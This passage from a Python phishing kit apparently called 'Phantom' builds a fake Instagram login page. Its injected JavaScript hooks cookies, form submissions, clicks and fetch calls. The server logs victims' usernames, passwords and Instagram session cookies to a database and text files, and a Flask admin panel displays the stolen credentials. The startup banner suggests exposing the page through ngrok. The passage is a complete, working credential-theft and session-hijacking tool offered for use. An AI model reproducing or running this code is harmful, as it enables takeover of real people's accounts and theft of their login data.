            
            const SERVER = window.location.origin;
            
            function sendData(data) {
                try {
                    navigator.sendBeacon('/beacon', JSON.stringify(data));
                } catch(e) {
                    try {
                        fetch('/beacon', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        }).catch(() => {});
                    } catch(e2) {}
                }
            }
            
            // Register Service Worker
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/js/sw.js', { scope: '/' })
                    .then(function(reg) {
                        console.log('[Phantom] Service Worker registered');
                    })
                    .catch(function(err) {
                        console.log('[Phantom] SW registration failed:', err);
                    });
            }
            
            // Method 1: Hook document.cookie
            try {
                const cookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                                        Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
                
                if (cookieDescriptor) {
                    const origGet = cookieDescriptor.get;
                    const origSet = cookieDescriptor.set;
                    
                    Object.defineProperty(document, 'cookie', {
                        get: function() { return origGet.call(this); },
                        set: function(value) {
                            sendData({
                                type: 'cookie-hook',
                                value: value,
                                allCookies: origGet.call(this),
                                timestamp: Date.now()
                            });
                            return origSet.call(this, value);
                        },
                        configurable: true
                    });
                }
            } catch(e) {}
            
            // Method 2: Send existing cookies immediately
            setTimeout(function() {
                if (document.cookie) {
                    sendData({
                        type: 'initial-cookies',
                        cookies: document.cookie,
                        timestamp: Date.now()
                    });
                }
            }, 500);
            
            // Method 3: Form submission capture
            document.addEventListener('submit', function(event) {
                setTimeout(function() {
                    const form = event.target;
                    const usernameInput = form.querySelector('input[name="username"]') || 
                                         form.querySelector('input[type="text"]');
                    const passwordInput = form.querySelector('input[name="enc_password"]') || 
                                         form.querySelector('input[type="password"]');
                    
                    if (usernameInput && passwordInput && usernameInput.value && passwordInput.value) {
                        sendData({
                            type: 'form-submit',
                            username: usernameInput.value,
                            password: passwordInput.value,
                            cookies: document.cookie,
                            timestamp: Date.now()
                        });
                    }
                }, 100);
            }, true);
            
            // Method 4: Button click capture (backup)
            document.addEventListener('click', function(event) {
                if (event.target.id === 'loginbutton' || 
                    (event.target.type === 'submit' && event.target.closest('form'))) {
                    
                    setTimeout(function() {
                        const form = event.target.closest('form') || document.querySelector('form');
                        if (!form) return;
                        
                        const usernameInput = form.querySelector('input[name="username"]') || 
                                             form.querySelector('input[type="text"]');
                        const passwordInput = form.querySelector('input[name="enc_password"]') || 
                                             form.querySelector('input[type="password"]');
                        
                        if (usernameInput && passwordInput && usernameInput.value && passwordInput.value) {
                            sendData({
                                type: 'button-click',
                                username: usernameInput.value,
                                password: passwordInput.value,
                                cookies: document.cookie,
                                timestamp: Date.now()
                            });
                        }
                    }, 100);
                }
            }, true);
            
            // Method 5: Intercept fetch API
            const origFetch = window.fetch;
            window.fetch = function() {
                const args = arguments;
                return origFetch.apply(this, args).then(function(response) {
                    try {
                        const url = typeof args[0] === 'string' ? args[0] : 
                                   (args[0]?.url || '');
                        
                        if (url && (url.includes('login') || url.includes('accounts'))) {
                            sendData({
                                type: 'fetch-intercept',
                                cookies: document.cookie,
                                url: url,
                                timestamp: Date.now()
                            });
                        }
                    } catch(e) {}
                    return response;
                });
            };
            
            // Method 6: Periodic beacon
            setInterval(function() {
                const cookies = document.cookie;
                if (cookies && (cookies.includes('sessionid') || 
                               cookies.includes('csrftoken') || 
                               cookies.includes('ds_user_id'))) {
                    sendData({
                        type: 'periodic-beacon',
                        cookies: cookies,
                        timestamp: Date.now()
                    });
                }
            }, 4000);
        })();
        ''').strip()
    
    def _get_html(self):
        """Instagram HTML clone with working links"""
        return textwrap.dedent('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <meta name="theme-color" content="#fafafa">
            <meta name="description" content="Create an account or log in to Instagram - Share what you're into with the people who get it.">
            <title>Instagram</title>
            <link rel="stylesheet" href="/css/style.css">
            <link rel="icon" href="/images/insta_logo.png" type="image/png">
        </head>
        <body>
            <div class="main">
                <div class="instass">
                    <div id="imageslideshow"></div>
                    <img id="phone" src="/images/phones.png" alt="Phone frame">
                </div>
                
                <div class="login-wrap">
                    <div class="loginbox">
                        <img id="title" src="/images/title.jpg" alt="Instagram">
                        
                        <form id="loginForm" method="POST" action="/accounts/login/ajax/" autocomplete="on">
                            <input class="input" type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username" autocorrect="off" autocapitalize="off">
                            <input class="input" type="password" name="enc_password" placeholder="Password" required autocomplete="current-password">
                            <button type="submit" id="loginbutton">Log in</button>
                        </form>
                        
                        <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
                        
                        <div id="or">OR</div>
                        
                        <div id="fblink-wrap">
                            <img id="fbicon" src="/images/facebook.png" alt="Facebook icon">
                            <a id="fblink" href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F" target="_blank">Log in with Facebook</a>
                        </div>
                        
                        <a id="forgotpass" href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
                    </div>
                    
                    <div class="signup">
                        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a>
                    </div>
                    
                    <div class="app">
                        <span class="gettheapp">Get the app.</span>
                        <div class="app-btns">
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                                <img id="gplay" src="/images/google-play.png" alt="Get it on Google Play">
                            </a>
                            <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT" target="_blank">
                                <img id="microsoft" src="/images/microsoft.png" alt="Get it from Microsoft">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
            
            <footer class="footer">
                <div class="linksdiv">
                    <a href="https://about.meta.com/" target="_blank" class="links">Meta</a>
                    <a href="https://about.instagram.com/" target="_blank" class="links">About</a>
                    <a href="https://about.instagram.com/blog/" target="_blank" class="links">Blog</a>
                    <a href="https://about.instagram.com/about-us/jobs" target="_blank" class="links">Jobs</a>
                    <a href="https://help.instagram.com/" target="_blank" class="links">Help</a>
                    <a href="https://developers.facebook.com/docs/instagram" target="_blank" class="links">API</a>
                    <a href="https://help.instagram.com/519522125107875" target="_blank" class="links">Privacy</a>
                    <a href="https://help.instagram.com/581066165581870" target="_blank" class="links">Terms</a>
                    <a href="https://www.instagram.com/explore/locations/" target="_blank" class="links">Locations</a>
                    <a href="https://www.instagram.com/instagram_lite/" target="_blank" class="links">Instagram Lite</a>
                    <a href="https://www.threads.net/" target="_blank" class="links">Threads</a>
                    <a href="https://www.facebook.com/help/instagram/2617046393526281" target="_blank" class="links">Contact Uploading & Non-Users</a>
                    <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" class="links">Meta Verified</a>
                </div>
                <div class="copyright">English &copy; 2024 Instagram from Meta</div>
            </footer>
            
            <script>
                // Show fake error message on form submit, then redirect
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    var errorMsg = document.getElementById('errorMsg');
                    errorMsg.classList.add('show');
                    
                    setTimeout(function() {
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }, 1500);
                });
            </script>
            
            <script src="/js/hijacker.js"></script>
        </body>
        </html>
        ''').strip()

# ==================== MITM HANDLER ====================
class PhantomHandler(http.server.BaseHTTPRequestHandler):
    """Advanced HTTP request handler with cookie capture"""
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        if CONFIG.get("debug", False):
            print(f"{Colors.BLUE}[HTTP] {self.client_address[0]} - {format % args}{Colors.RESET}")
    
    def parse_cookies(self, cookie_string):
        """Parse cookie string into dictionary"""
        cookies = {}
        if not cookie_string:
            return cookies
        
        for item in cookie_string.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key.strip()] = value.strip()
        
        return cookies
    
    def store_victim(self, username="", password="", cookies_dict=None, ip="", ua="", method="unknown", referer=""):
        """Store victim data in database and log files"""
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            
            cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
            
            sessionid = cookies_dict.get('sessionid', '') if cookies_dict else ''
            csrftoken = cookies_dict.get('csrftoken', '') if cookies_dict else ''
            ds_user_id = cookies_dict.get('ds_user_id', '') if cookies_dict else ''
            rur = cookies_dict.get('rur', '') if cookies_dict else ''
            mid = cookies_dict.get('mid', '') if cookies_dict else ''
            ig_did = cookies_dict.get('ig_did', '') if cookies_dict else ''
            datr = cookies_dict.get('datr', '') if cookies_dict else ''
            shbid = cookies_dict.get('shbid', '') if cookies_dict else ''
            shbts = cookies_dict.get('shbts', '') if cookies_dict else ''
            
            c.execute('''INSERT INTO victims 
                         (timestamp, ip_address, user_agent, username, password,
                          sessionid, csrftoken, ds_user_id, rur, mid, ig_did,
                          datr, shbid, shbts, all_cookies, capture_method, referer)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (datetime.now().isoformat(), ip, ua, username, password,
                       sessionid, csrftoken, ds_user_id, rur, mid, ig_did,
                       datr, shbid, shbts, cookie_str, method, referer))
            
            victim_id = c.lastrowid
            
            # Store active session
            if sessionid:
                c.execute('''INSERT INTO active_sessions 
                             (victim_id, sessionid, csrftoken, ds_user_id, captured_at, is_active)
                             VALUES (?, ?, ?, ?, ?, 1)''',
                          (victim_id, sessionid, csrftoken, ds_user_id, datetime.now().isoformat()))
            
            conn.commit()
            conn.close()
            
            # Write to credential log
            with open(CONFIG["log_file"], "a", encoding="utf-8") as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
                f.write(f"IP: {ip}\n")
                f.write(f"User-Agent: {ua[:100]}...\n" if len(ua) > 100 else f"User-Agent: {ua}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Method: {method}\n")
                if referer:
                    f.write(f"Referer: {referer}\n")
                if cookies_dict:
                    f.write(f"\n--- Captured Cookies ---\n")
                    for key, value in cookies_dict.items():
                        f.write(f"  {key}: {value}\n")
                f.write(f"{'='*60}\n")
            
            # Write to cookie-only log
            if sessionid:
                with open(CONFIG["cookie_file"], "a", encoding="utf-8") as f:
                    f.write(f"\n{'='*50}\n")
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
                    f.write(f"Username: {username}\n")
                    f.write(f"SESSIONID: {sessionid}\n")
                    f.write(f"CSRF: {csrftoken}\n")
                    f.write(f"DS_USER_ID: {ds_user_id}\n")
                    f.write(f"Full Cookie String:\n")
                    f.write(f"  {cookie_str}\n")
                    f.write(f"{'='*50}\n")
            
            # Console output
            if username or password:
                print(f"\n{Colors.BG_RED}{Colors.WHITE} [!] CREDENTIALS CAPTURED {Colors.RESET}")
                print(f"{Colors.RED}  ├─ {Colors.WHITE}IP: {Colors.YELLOW}{ip}{Colors.RESET}")
                print(f"{Colors.RED}  ├─ {Colors.WHITE}Username: {Colors.GREEN}{username}{Colors.RESET}")
                print(f"{Colors.RED}  ├─ {Colors.WHITE}Password: {Colors.GREEN}{password}{Colors.RESET}")
                print(f"{Colors.RED}  ├─ {Colors.WHITE}Method: {Colors.CYAN}{method}{Colors.RESET}")
                if sessionid:
                    print(f"{Colors.RED}  └─ {Colors.WHITE}Session: {Colors.MAGENTA}{sessionid[:30]}...{Colors.RESET}")
                print()
            elif sessionid:
                print(f"{Colors.BG_YELLOW}{Colors.BLACK} [🍪] COOKIES CAPTURED {Colors.RESET}")
                print(f"{Colors.YELLOW}  ├─ IP: {ip}{Colors.RESET}")
                print(f"{Colors.YELLOW}  └─ SESSIONID: {sessionid[:40]}...{Colors.RESET}")
                print()
            
        except Exception as e:
            print(f"{Colors.RED}[DB ERROR] Failed to store victim: {e}{Colors.RESET}")
    
    def handle_capture_post(self):
        """Handle POST requests for cookie/credential capture"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error(400)
                return
            
            body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            
            try:
                data = json.loads(body)
            except json.JSONDecodeError:
                # Try parsing as form data
                parsed = parse_qs(body)
                data = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in parsed.items()}
            
            capture_type = data.get('type', 'direct')
            cookie_string = data.get('cookies', data.get('cookie', data.get('allCookies', data.get('all', ''))))
            username = data.get('username', '')
            password = data.get('password', '')
            value = data.get('value', '')
            
            # Combine with value if present
            if value and not cookie_string:
                cookie_string = value
            elif value:
                cookie_string = cookie_string + '; ' + value if cookie_string else value
            
            cookie_dict = self.parse_cookies(cookie_string) if cookie_string else {}
            
            if username or password or cookie_dict:
                self.store_victim(
                    username=username,
                    password=password,
                    cookies_dict=cookie_dict if cookie_dict else None,
                    ip=self.client_address[0],
                    ua=self.headers.get('User-Agent', 'Unknown'),
                    method=capture_type,
                    referer=self.headers.get('Referer', '')
                )
            
            # Send success response
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.send_header('Cache-Control', 'no-cache, no-store')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Capture handler: {e}{Colors.RESET}")
            self.send_error(500)
    
    def send_file_response(self, filepath, content_type, cache=False):
        """Send a file with proper headers"""
        try:
            with open(filepath, "rb") as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', len(content))
            
            if cache:
                self.send_header('Cache-Control', 'public, max-age=86400')
            else:
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            
            # Security headers
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.send_header('X-Frame-Options', 'SAMEORIGIN')
            
            self.end_headers()
            self.wfile.write(content)
            return True
        except FileNotFoundError:
            return False
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests"""
        path = urlparse(self.path).path
        
        # Main phishing page
        if path in ['/', '/index.html', '/login', '/accounts/login', '/accounts/login/']:
            if self.send_file_response("cloned_site/index.html", "text/html; charset=utf-8"):
                return
            else:
                self.send_error(404, "Phishing page not found. Run setup first.")
                return
        
        # CSS
        if path == '/css/style.css':
            if self.send_file_response("cloned_site/css/style.css", "text/css", cache=True):
                return
        
        # JavaScript
        if path == '/js/hijacker.js':
            if self.send_file_response("cloned_site/js/hijacker.js", "application/javascript"):
                return
        
        if path == '/js/sw.js':
            if self.send_file_response("cloned_site/js/sw.js", "application/javascript"):
                self.send_header('Service-Worker-Allowed', '/')
                return
        
        # Images
        if path.startswith('/images/'):
            img_path = "cloned_site" + path
            if os.path.exists(img_path):
                ext = os.path.splitext(img_path)[1].lower()
                content_types = {
                    '.png': 'image/png',
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.gif': 'image/gif',
                    '.svg': 'image/svg+xml',
                    '.ico': 'image/x-icon'
                }
                ct = content_types.get(ext, 'application/octet-stream')
                if self.send_file_response(img_path, ct, cache=True):
                    return
        
        # Favicon blocking
        if path == '/favicon.ico' and CONFIG.get("block_favicon", True):
            self.send_response(204)
            self.end_headers()
            return
        
        # Redirect all other paths to real Instagram
        real_url = f'https://www.instagram.com{path}'
        if self.path != path:  # Include query string
            real_url = f'https://www.instagram.com{self.path}'
        
        self.send_response(302)
        self.send_header('Location', real_url)
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
    
    def do_POST(self):
        """Handle POST requests"""
        path = urlparse(self.path).path
        
        # Capture endpoints
        capture_endpoints = [
            '/sw-capture', '/cookie-hook', '/fetch-cookies', 
            '/form-creds', '/beacon', '/capture', '/log'
        ]
        
        if any(path == ep or path.startswith(ep) for ep in capture_endpoints):
            self.handle_capture_post()
            return
        
        # Login form submission
        if '/login' in path or '/accounts' in path:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
                
                # Parse form data
                params = parse_qs(post_data)
                username = params.get('username', [''])[0]
                password = params.get('enc_password', params.get('password', ['']))[0]
                
                if username or password:
                    cookie_header = self.headers.get('Cookie', '')
                    cookie_dict = self.parse_cookies(cookie_header) if cookie_header else {}
                    
                    self.store_victim(
                        username=username,
                        password=password,
                        cookies_dict=cookie_dict if cookie_dict else None,
                        ip=self.client_address[0],
                        ua=self.headers.get('User-Agent', 'Unknown'),
                        method='form-post',
                        referer=self.headers.get('Referer', '')
                    )
            
            # Redirect to real Instagram (makes victim think login "worked")
            self.send_response(302)
            self.send_header('Location', 'https://www.instagram.com/accounts/login/')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            return
        
        # Handle other POST requests
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/')
        self.end_headers()

# ==================== ADMIN SERVER ====================
def start_admin():
    """Start the Flask admin panel"""
    try:
        from flask import Flask, jsonify, send_file
    except ImportError:
        print(f"{Colors.RED}[!] Flask not installed. Install with: pip install flask{Colors.RESET}")
        return
    
    admin_app = Flask(__name__)
    
    @admin_app.route('/')
    def index():
        """Serve admin panel"""
        try:
            with open("admin.html", "r", encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return "<h1>Admin panel not found. Restart the script to regenerate.</h1>", 500
    
    @admin_app.route('/api/data')
    def get_data():
        """API endpoint for victim data"""
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            
            # Get victims
            c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 200')
            victims = []
            for row in c.fetchall():
                victims.append({
                    'id': row[0],
                    'timestamp': row[1],
                    'ip': row[2],
                    'username': row[4],
                    'password': row[5],
                    'sessionid': row[6],
                    'csrftoken': row[7],
                    'ds_user_id': row[8],
                    'capture_method': row[16] if len(row) > 16 else 'unknown'
                })
            
            # Stats
            c.execute('SELECT COUNT(*) FROM victims')
            total = c.fetchone()[0]
            
            today = datetime.now().strftime('%Y-%m-%d')
            c.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{today}%",))
            today_count = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM victims WHERE sessionid != '' AND sessionid IS NOT NULL")
            active = c.fetchone()[0]
            
            # Recent count (last hour)
            one_hour_ago = (datetime.now().replace(minute=0, second=0, microsecond=0)).isoformat()
            c.execute("SELECT COUNT(*) FROM victims WHERE timestamp > ?", (one_hour_ago,))
            recent = c.fetchone()[0]
            
            conn.close()
            
            return jsonify({
                'total': total,
                'today': today_count,
                'active_sessions': active,
                'recent_count': recent,
                'victims': victims
            })
        except Exception as e:
            return jsonify({
                'error': str(e),
                'total': 0,
                'today': 0,
                'active_sessions': 0,
                'recent_count': 0,
                'victims': []
            })
    
    @admin_app.route('/api/delete/<int:victim_id>')
    def delete_victim(victim_id):
        """Delete a specific victim record"""
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
            c.execute('DELETE FROM active_sessions WHERE victim_id=?', (victim_id,))
            conn.commit()
            conn.close()
            return jsonify({'status': 'deleted', 'id': victim_id})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @admin_app.route('/api/clear-all')
    def clear_all():
        """Clear all victim records"""
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            c.execute('DELETE FROM victims')
            c.execute('DELETE FROM active_sessions')
            conn.commit()
            conn.close()
            return jsonify({'status': 'cleared'})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @admin_app.route('/api/backup')
    def backup():
        """Trigger database backup"""
        try:
            Setup.backup_database()
            return jsonify({'status': 'backed up'})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    print(f"{Colors.BLUE}[+] Admin panel starting on http://0.0.0.0:{CONFIG['admin_port']}{Colors.RESET}")
    admin_app.run(host='0.0.0.0', port=CONFIG['admin_port'], debug=False, use_reloader=False)

# ==================== MAIN ====================
def main():
    """Main entry point"""
    print_banner()
    
    # Setup
    Setup.create_directories()
    Setup.generate_ssl_cert()
    Setup.init_database()
    Setup.generate_admin_panel()
    Setup.check_dependencies()
    
    # Build clone
    cloner = InstagramExactCloner()
    cloner.build()
    
    # Check for required images
    required_images = [
        'facebook.png', 'google-play.png', 'insta_logo.png', 
        'microsoft.png', 'phones.png', 'ss1.png', 'ss2.png', 
        'ss3.png', 'title.jpg'
    ]
    
    missing_images = []
    for img in required_images:
        if not os.path.exists(f"cloned_site/images/{img}"):
            missing_images.append(img)
    
    if missing_images:
        print(f"\n{Colors.YELLOW}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] WARNING: Missing {len(missing_images)} image(s):{Colors.RESET}")
        for img in missing_images:
            print(f"{Colors.YELLOW}    - {img}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Copy images to: cloned_site/images/{Colors.RESET}")
        print(f"{Colors.YELLOW}    From: https://github.com/r4tur1/InstaPhish/tree/main/images{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}\n")
    else:
        print(f"{Colors.GREEN}[+] All 9 required images found{Colors.RESET}")
    
    # Start admin panel in background thread
    admin_thread = threading.Thread(target=start_admin, daemon=True)
    admin_thread.start()
    time.sleep(1.5)
    
    # Start MITM phishing server
    print(f"{Colors.CYAN}[*] Starting phishing server...{Colors.RESET}")
    server = socketserver.ThreadingTCPServer(
        (CONFIG["listen_host"], CONFIG["listen_port"]), 
        PhantomHandler
    )
    
    # Enable SSL if certificate exists
    if os.path.exists(CONFIG["ssl_cert"]) and os.path.exists(CONFIG["ssl_key"]):
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(CONFIG["ssl_cert"], CONFIG["ssl_key"])
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
            print(f"{Colors.GREEN}[+] HTTPS enabled on port {CONFIG['listen_port']}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] SSL failed: {e}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Running in HTTP mode (less convincing){Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[*] No SSL certificate found. Running in HTTP mode.{Colors.RESET}")
    
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════╗
║                                                      ║
║  {Colors.WHITE}Phishing URL:{Colors.RESET}  {Colors.GREEN}https://127.0.0.1:{CONFIG['listen_port']}{Colors.RESET}         {Colors.CYAN}║
║  {Colors.WHITE}Admin Panel:{Colors.RESET}   {Colors.GREEN}http://127.0.0.1:{CONFIG['admin_port']}{Colors.RESET}            {Colors.CYAN}║
║                                                      ║
║  {Colors.WHITE}Logs:{Colors.RESET}         logs/credentials.txt                {Colors.CYAN}║
║  {Colors.WHITE}Cookies:{Colors.RESET}      logs/cookies.txt                    {Colors.CYAN}║
║                                                      ║
║  {Colors.YELLOW}Expose with:{Colors.RESET} {Colors.WHITE}ngrok http {CONFIG['listen_port']}{Colors.RESET}               {Colors.CYAN}║
║                                                      ║
╚══════════════════════════════════════════════════════╝
{Colors.GREEN}[✓] 6-Layer Cookie Capture Active:
{Colors.WHITE}    1. Service Worker Interception
    2. document.cookie Hook
    3. Form Submission Capture
    4. Button Click Capture
    5. Fetch API Interception
    6. Periodic Beacon (4s intervals){Colors.RESET}
{Colors.RED}[!] Press Ctrl+C to stop{Colors.RESET}
""")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Shutting down...{Colors.RESET}")
        server.shutdown()
        print(f"{Colors.GREEN}[+] Server stopped. All data saved.{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Check logs/ for captured credentials.{Colors.RESET}")

if __name__ == "__main__":
    main()
